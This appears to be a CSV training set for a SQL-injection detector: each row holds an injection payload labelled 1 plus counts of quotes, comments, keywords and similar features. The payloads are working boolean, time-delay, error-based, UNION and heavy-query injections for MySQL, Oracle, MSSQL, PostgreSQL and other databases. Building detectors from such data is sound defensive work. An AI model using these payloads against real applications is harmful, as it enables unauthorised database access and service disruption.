Query,Label,query_len,num_words_query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords
1'||  (  select 'lmsc' from dual where 1162  =  1162 order by 1--,1,65,13,3,0,9,1,0,12,0,1,2,0,0,30,10,0,2
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   ""bhmu"" like ""bhmu",1,97,16,0,3,12,0,0,15,0,1,1,0,0,44,8,0,2
"-6357""  )   order by 1--",1,24,5,0,1,5,1,0,4,0,0,3,0,0,7,5,0,1
"1""   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""zptu""  =  ""zptu",1,373,78,0,4,64,0,0,77,0,12,0,0,0,92,49,10,1
"1 and make_set  (  9681  =  4703,4703  )  # zbrf",1,48,10,0,0,6,0,0,9,0,1,0,0,0,14,13,0,0
"1'  )   as sjzi where 8242  =  8242 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,163,29,1,0,18,1,0,28,0,1,3,0,0,83,17,0,2
1'+  (  select rhlb where 9477  =  9477,1,39,8,1,0,4,0,0,7,0,0,1,0,0,15,9,0,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   ""%""  =  """,1,116,19,0,3,15,0,0,18,1,1,1,0,0,65,3,0,2
"-2216""  )   where 6692  =  6692 union all select 6692,6692,6692#",1,64,10,0,1,7,0,0,9,0,0,1,0,0,19,24,0,1
-6397%' or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  ,1,255,51,1,0,42,0,0,51,1,8,1,0,0,79,36,7,1
"1'  )   as afnt where 4719  =  4719 and elt  (  8224  =  1275,1275  )  --",1,73,16,1,0,9,1,0,15,0,1,2,0,0,17,21,0,0
1'   )    )    as rxxd where 5049  =  5049,1,42,9,1,0,4,0,0,8,0,0,0,0,0,11,9,0,0
"1'+  (  select sxco where 1623  =  1623 union all select null,null--",1,68,12,1,0,7,1,0,11,0,0,3,2,0,37,9,2,2
"1"" where 4978  =  4978 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,195,32,0,1,16,1,0,31,0,1,3,0,0,114,20,0,2
1' where 3188  =  3188 and 9198  =  9198--,1,42,9,1,0,5,1,0,8,0,1,2,0,0,8,17,0,0
"1'+  (  select 'eoxk' where 6621  =  6621 union all select null,null#",1,69,12,3,0,8,0,0,11,0,0,1,2,0,37,9,2,2
1  )   as qywz where 1864  =  1864 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1,363,80,0,0,49,1,0,79,0,1,12,0,0,89,55,12,1
"1""   )    )    union all select null,null--",1,43,7,0,1,6,1,0,6,0,0,2,2,0,22,1,2,1
"1 where 2988  =  2988 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,139,23,0,0,18,1,0,22,0,1,3,0,0,67,18,0,2
"1'  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  'mseo' like 'mseo",1,160,27,4,0,19,0,0,26,0,2,1,0,0,87,9,0,2
"1""   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""vlev"" like ""vlev",1,298,52,0,4,37,0,0,51,0,2,2,0,0,111,35,1,4
1'+  (  select 'rkap' where 9692  =  9692,1,41,8,3,0,6,0,0,7,0,0,1,0,0,15,9,0,1
"1%'   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   '%'  =  '",1,77,16,4,0,15,0,0,15,2,2,0,0,0,9,13,0,0
"1""   )    )    as qejm where 9014  =  9014 union all select null,null,null,null,null,null#",1,90,13,0,1,10,0,0,12,0,0,0,6,0,49,9,6,1
-9556'  )   where 2472  =  2472 or   (  2883  =  9968  )  *9968--,1,65,13,1,0,10,1,0,12,0,1,4,0,0,7,24,0,0
1  )   as nxmd where 8650  =  8650,1,34,8,0,0,2,0,0,7,0,0,0,0,0,11,9,0,0
-8812 or 6872  =  6872# dflr,1,28,6,0,0,3,0,0,5,0,1,1,0,0,6,12,0,0
1%' and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and '%'  =  ',1,131,26,8,0,21,0,0,25,2,4,0,0,0,56,15,0,1
"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'iaud'  =  'iaud",1,182,31,4,0,24,0,0,30,0,2,1,0,0,82,9,0,2
1 and   (  3020  =  3020  )  *6703-- zsnl,1,41,9,0,0,6,1,0,8,0,1,3,0,0,7,13,0,0
1   )    )    as rhwg where 8843  =  8843,1,41,9,0,0,3,0,0,8,0,0,0,0,0,11,9,0,0
-2495   )    )    as hudw where 4197  =  4197 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 e,1,255,51,0,0,36,0,0,50,0,6,1,0,0,76,41,5,1
"-9697  )   union all select 3052,3052,3052,3052,3052,3052,3052,3052,3052--",1,74,6,0,0,12,1,0,5,0,0,3,0,0,14,40,0,1
"-4068'   )    )     )   union all select 9491,9491,9491--",1,57,8,1,0,9,1,0,7,0,0,3,0,0,14,16,0,1
"1%""   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,122,21,2,1,20,1,0,20,1,1,3,0,0,31,15,0,0
"elt  (  5098  =  2728,1  )  ",1,28,6,0,0,4,0,0,6,0,0,0,0,0,3,9,0,0
1' where 7882  =  7882 and 6663  =  4524--,1,42,9,1,0,5,1,0,8,0,1,2,0,0,8,17,0,0
"1%""   )    )     )   union all select null,null,null--",1,54,8,0,1,9,1,0,7,1,0,2,3,0,26,1,3,1
"1""   )    )    as bosq where 4695  =  4695",1,42,9,0,1,4,0,0,8,0,0,0,0,0,11,9,0,0
"-6463""   )    )     )   union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#",1,86,8,0,1,14,0,0,7,0,0,1,0,0,14,40,0,1
"1'   )    )    as nlfq where 3410  =  3410 or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1,181,30,1,0,22,1,0,29,0,1,2,0,1,47,43,0,1
"1'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (   'ylql' like 'ylql",1,166,32,4,0,29,0,0,31,0,5,0,0,0,51,16,4,0
if  (  3593  =  3779  )   select 3593 else drop function qtqy--,1,63,12,0,0,5,1,0,11,0,0,2,0,0,28,12,0,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   8535  =  8535",1,120,19,0,0,11,0,0,18,0,1,1,0,0,65,11,0,2
if  (  8995  =  9787  )   select 8995 else drop function ofgg--,1,63,12,0,0,5,1,0,11,0,0,2,0,0,28,12,0,1
"1""  )   rlike sleep  (  5  )   and   (  ""efoq"" like ""efoq",1,57,12,0,4,8,0,0,11,0,1,0,0,0,25,2,0,0
"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'pydi' like 'pydi",1,392,83,4,0,55,0,0,82,0,2,10,0,0,107,47,12,2
"1'+  (  select sshu where 3442  =  3442 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",1,288,48,2,0,34,0,0,47,0,1,4,0,1,64,79,0,5
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'inec'  =  'inec",1,120,19,5,0,17,0,0,18,0,1,1,0,0,46,10,0,1
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   '%'  =  ',1,97,21,3,0,16,0,0,21,1,1,1,0,0,28,1,0,2
"1""  )   as jscj where 2308  =  2308 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,150,27,0,1,16,1,0,26,0,1,3,0,0,75,16,0,2
"1%'   )    )    and make_set  (  6527  =  9529,9529  )   and    (    (   '%'  =  '",1,82,16,4,0,16,0,0,15,2,2,0,0,0,13,13,0,0
"1 where 5401  =  5401 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1,73,16,0,0,9,1,0,15,0,1,2,0,0,16,18,0,0
"1%'  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  '%'  =  '",1,76,17,4,0,15,0,0,16,2,2,0,0,0,13,10,0,0
"1%""   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   ""%""  =  """,1,330,64,0,4,41,0,0,63,2,2,2,0,0,101,55,0,7
"1""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""vdyr""  =  ""vdyr",1,337,64,0,4,39,0,0,63,0,2,2,0,0,110,55,0,7
1'  )   and 4380  =  5851 and   (  'cxcl'  =  'cxcl,1,51,11,4,0,8,0,0,10,0,2,0,0,0,14,9,0,0
-6757'   )    )     )   or 4524  =  3696,1,40,8,1,0,6,0,0,7,0,1,1,0,0,2,12,0,0
"1  )   where 4810  =  4810 union all select null,null#",1,54,10,0,0,4,0,0,9,0,0,0,2,0,27,9,2,1
-6586'   )    )    or 2021  =  2996,1,35,7,1,0,5,0,0,6,0,1,1,0,0,2,12,0,0
"-4100'   )    )    union all select 1163,1163,1163--",1,52,7,1,0,8,1,0,6,0,0,3,0,0,14,16,0,1
"-2216   )    )    as hxmq where 5677  =  5677 union all select 5677,5677--",1,74,13,0,0,7,1,0,12,0,0,3,0,0,25,20,0,1
"1%""  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""%""  =  """,1,198,33,0,4,21,0,0,32,2,2,1,0,0,112,12,0,2
"1'  )   where 7887  =  7887 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1,167,28,1,0,22,1,0,27,0,1,2,0,1,39,47,0,1
"-6942'  )   union all select 7280,7280,7280#",1,44,6,1,0,6,0,0,5,0,0,1,0,0,14,16,0,1
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  +'",1,109,17,1,0,13,0,0,16,0,0,2,0,0,69,4,0,2
"-6000""  )   where 1797  =  1797 union all select 1797,1797,1797,1797,1797,1797,1797,1797--",1,90,10,0,1,13,1,0,9,0,0,3,0,0,19,44,0,1
"1   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,248,51,0,0,44,1,0,50,0,6,2,2,0,71,25,9,0
"-7876%'  )   union all select 3909,3909,3909,3909,3909#",1,55,6,1,0,9,0,0,5,1,0,1,0,0,14,24,0,1
"1' union all select null,null,null,null,null,null#",1,50,5,1,0,7,0,0,4,0,0,0,6,0,38,1,6,1
"1 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  ",1,252,44,0,0,29,0,0,44,0,1,2,0,0,97,35,1,4
"1  )   as xuvz where 3061  =  3061 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,161,29,0,0,17,1,0,28,0,1,3,0,0,82,17,0,2
"-9583%""   )    )    union all select 9349,9349,9349,9349,9349,9349,9349--",1,73,7,0,1,13,1,0,6,1,0,3,0,0,14,32,0,1
"-5385"" union all select 4577,4577,4577,4577,4577,4577,4577#",1,59,5,0,1,9,0,0,4,0,0,1,0,0,14,32,0,1
"1  )   where 5048  =  5048 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,203,41,0,0,31,1,0,40,0,4,2,1,0,57,35,6,0
"-4944%""   )    )    or make_set  (  1084  =  1988,1988  )   and    (    (   ""%""  =  """,1,85,16,0,4,17,0,0,15,2,2,1,0,0,12,16,0,0
"1 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1,327,70,0,0,55,0,0,70,0,11,0,0,0,81,49,10,1
"-8707'  )   union all select 5609,5609,5609--",1,45,6,1,0,7,1,0,5,0,0,3,0,0,14,16,0,1
"1"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1,346,75,0,1,48,0,0,75,0,1,10,0,0,92,47,12,2
"1""   )    )     )   union all select null,null,null,null,null,null#",1,67,8,0,1,10,0,0,7,0,0,0,6,0,38,1,6,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and 'xemh'  =  'xemh",1,111,17,3,0,12,0,0,16,0,1,1,0,0,73,3,0,2
if  (  9690  =  6491  )   select 9690 else drop function nyln--,1,63,12,0,0,5,1,0,11,0,0,2,0,0,28,12,0,1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",1,123,22,3,0,17,0,0,21,0,1,0,1,0,49,14,2,0
"-1051""  )   where 6586  =  6586 or 6647  =  6738#",1,49,10,0,1,6,0,0,9,0,1,1,0,0,7,20,0,0
1'+  (  select zmbu where 8685  =  8685 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )     )  +',1,136,28,2,0,14,0,0,27,0,0,2,0,1,46,21,0,2
"1 where 5627  =  5627 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,124,22,2,0,16,1,0,21,0,1,3,0,0,37,23,0,0
1 where 4949  =  4949,1,21,5,0,0,1,0,0,4,0,0,0,0,0,5,9,0,0
"1  )   where 7881  =  7881 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,145,24,0,0,19,1,0,23,0,1,3,0,0,68,18,0,2
1'   )    )    waitfor delay '0:0:5' and    (    (   'amnf' like 'amnf,1,70,12,6,0,12,0,0,11,0,1,0,0,0,27,4,0,0
"1  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   ",1,144,22,0,0,17,0,0,22,0,1,0,0,1,37,35,0,1
"-7379 union all select 9813,9813,9813,9813,9813,9813,9813,9813--",1,64,5,0,0,10,1,0,4,0,0,3,0,0,14,36,0,1
"select count  (  *  )   from generate_series  (  1,5000000  )   and 'fahy' like 'fahy",1,85,14,3,0,10,0,0,13,0,1,1,0,0,44,8,0,2
"1""   )    )    as dcrk where 5164  =  5164 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,215,36,0,1,18,1,0,35,0,1,3,0,0,120,20,0,2
-8745'  )   as xpwv where 8855  =  8855 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from du,1,255,52,1,0,36,0,0,51,0,6,1,0,0,82,41,5,1
"1   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  4858  =  4858",1,153,27,2,0,20,0,0,26,0,2,1,0,0,34,23,0,0
1  )   where 1203  =  1203 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1,106,23,0,0,12,0,0,22,0,0,1,0,0,35,10,0,2
"-2418'||  (  select 'mdbt' from dual where 3026  =  3026 union all select 3026,3026,3026,3026,3026,3026,3026,3026,3026--",1,120,14,3,0,18,1,0,13,0,1,3,0,0,37,48,0,2
1 where 3357  =  3357 and   (  9492  =  4334  )  *4334--,1,56,12,0,0,7,1,0,11,0,1,3,0,0,8,21,0,0
"1%'   )    )    union all select null,null,null#",1,48,7,1,0,7,0,0,6,1,0,0,3,0,26,1,3,1
"1%""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""%""  =  """,1,129,24,0,4,21,0,0,23,2,2,1,0,0,34,13,0,2
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  ""%""  =  """,1,128,20,0,3,16,0,0,19,1,1,1,0,0,72,3,0,2
"1""   )    )    as tncm where 8203  =  8203 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,165,28,0,1,17,1,0,27,0,1,3,0,0,83,16,0,2
"1'   )    )     )   and make_set  (  6094  =  2929,2929  )   and    (    (     (  'gkyo'  =  'gkyo",1,98,18,4,0,16,0,0,17,0,2,0,0,0,21,13,0,0
1'||  (  select 'feyg' from dual where 7734  =  7734 and 3843  =  6724#,1,71,14,3,0,9,0,0,13,0,2,0,0,0,26,17,0,1
"1""   )    )     )   and 7533  =  7533 and    (    (     (  ""xopd""  =  ""xopd",1,75,15,0,4,12,0,0,14,0,2,0,0,0,14,9,0,0
"1%""  )   and elt  (  7436  =  9874,9874  )   and   (  ""%""  =  """,1,63,14,0,4,13,0,0,13,2,2,0,0,0,9,13,0,0
-2866'   )    )    or 4491  =  9429#,1,36,7,1,0,6,0,0,6,0,1,1,0,0,2,12,0,0
"1'  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1,177,28,1,0,14,0,0,28,0,1,1,0,0,108,12,0,2
end and    (    (   'pfrt'  =  'pfrt,1,36,7,3,0,6,0,0,6,0,1,0,0,0,14,0,0,0
1  )   as ozga where 4002  =  4002 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1,98,21,0,0,10,1,0,20,0,1,2,0,0,31,18,0,1
"iif  (  7011  =  2522,1,1/0  )  ",1,32,6,0,0,6,0,0,6,0,0,1,0,0,3,11,0,0
-4904'  )   as ogyu where 2821  =  2821 or 5982  =  1643,1,56,12,1,0,5,0,0,11,0,1,1,0,0,13,20,0,0
-3339' or 8571  =  8571--,1,25,5,1,0,5,1,0,4,0,1,3,0,0,2,12,0,0
"1%'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   '%'  =  '",1,160,32,4,0,32,0,0,31,2,5,0,0,0,40,16,4,0
"1"" or elt  (  6272  =  6272,sleep  (  5   )    )    and ""hvic"" like ""hvic",1,73,15,0,4,10,0,0,14,0,2,0,0,0,25,10,0,0
1' and   (  3020  =  3020  )  *6703 and 'hnvf'  =  'hnvf,1,56,12,4,0,9,0,0,11,0,2,1,0,0,14,13,0,0
"1' where 3125  =  3125   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  --",1,303,55,1,0,40,1,0,54,0,3,2,1,0,112,42,6,1
"-6108'  )   union all select 2519,2519,2519,2519--",1,50,6,1,0,8,1,0,5,0,0,3,0,0,14,20,0,1
"1""   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1,135,23,0,1,17,1,0,22,0,1,3,0,0,65,8,0,2
"1""  )   where 2839  =  2839 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,146,24,0,1,20,1,0,23,0,1,3,0,0,68,18,0,2
"-6848""   )    )    or 4071  =  5312",1,35,7,0,1,5,0,0,6,0,1,1,0,0,2,12,0,0
"1""  )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,98,18,0,1,14,1,0,17,0,1,3,0,0,32,13,0,2
"1%'   )    )     )   union all select null,null,null,null,null,null,null,null,null--",1,84,8,1,0,15,1,0,7,1,0,2,9,0,50,1,9,1
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  #,1,72,16,0,0,10,0,0,16,0,0,1,0,0,25,1,0,2
1'+  (  select 'stsu' where 2386  =  2386 or sleep  (  5  )  #,1,62,14,3,0,9,0,0,13,0,1,1,0,0,22,10,0,1
"1  )   where 9149  =  9149 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1,204,41,0,0,31,1,0,40,0,4,2,1,0,58,35,6,0
-5470'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'oeam'  =  'oeam,1,83,16,4,0,14,0,0,15,0,2,2,0,0,13,16,0,0
1'||  (  select 'hlxd' from dual where 2615  =  2615 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ||',1,381,78,4,0,65,0,0,77,0,13,0,0,0,112,53,10,2
-4583'  )   as evbo where 6055  =  6055 union all select 6055--,1,63,12,1,0,6,1,0,11,0,0,3,0,0,25,16,0,1
"1%'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",1,151,27,6,0,26,0,0,26,2,2,1,0,0,34,15,0,0
1'||  (  select 'kptj' from dual where 5123  =  5123,1,52,10,3,0,7,0,0,9,0,1,0,0,0,23,9,0,1
"-3126   )    )    union all select 6718,6718,6718,6718,6718--",1,61,7,0,0,9,1,0,6,0,0,3,0,0,14,24,0,1
"-7448 union all select 4072,4072#",1,33,5,0,0,3,0,0,4,0,0,1,0,0,14,12,0,1
"1""   )    )    and 9800  =  8713",1,32,7,0,1,4,0,0,6,0,1,0,0,0,3,9,0,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'fvda' like 'fvda",1,143,27,3,0,23,0,0,26,0,4,0,0,0,63,10,4,1
"1' in boolean mode  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  #",1,144,24,1,0,14,0,0,23,0,1,1,0,0,84,8,0,2
"-3194""   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  ( ",1,255,51,0,1,41,0,0,51,0,7,1,0,0,76,33,6,1
"-4919  )   union all select 2608,2608,2608,2608,2608,2608#",1,58,6,0,0,8,0,0,5,0,0,1,0,0,14,28,0,1
"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  ",1,116,22,4,1,15,0,0,22,0,3,0,0,0,53,15,0,1
"-2434'   )    )     )   union all select 5509,5509,5509,5509,5509,5509,5509--",1,77,8,1,0,13,1,0,7,0,0,3,0,0,14,32,0,1
"-7568""   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  ( ",1,255,51,0,1,41,0,0,51,0,7,1,0,0,76,33,6,1
"1"" where 7015  =  7015 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1,210,36,0,1,22,1,0,35,0,0,2,0,1,71,45,0,1
"1""  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  ""hbgv""  =  ""hbgv",1,202,37,0,4,28,0,0,36,0,2,1,0,1,55,32,0,3
"-1869""   )    )     )   union all select 7122,7122,7122,7122,7122,7122,7122,7122,7122--",1,87,8,0,1,15,1,0,7,0,0,3,0,0,14,40,0,1
